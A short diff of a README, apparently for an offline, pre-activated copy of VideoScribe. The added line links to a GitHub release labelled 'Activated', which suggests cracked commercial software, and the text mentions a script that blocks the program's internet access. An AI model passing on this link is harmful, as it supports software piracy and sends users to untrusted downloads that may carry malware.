@@ -4,7 +4,7 @@
 
 VideoScribe becomes corrupted whenever it connects to the internet.  
 After corruption, reinstalling the software does not fix it. However, deleting the AppData folders listed below has been found to resolve the issue.
-
+https://github.com/Jayasankha-dev/Sparkol_VideoScribe_Pro_Offline_v2.3.6_Activated/releases/tag/VideoScribe
 ## Solution
 
 Use the provided `blockinternet.bat` script to:
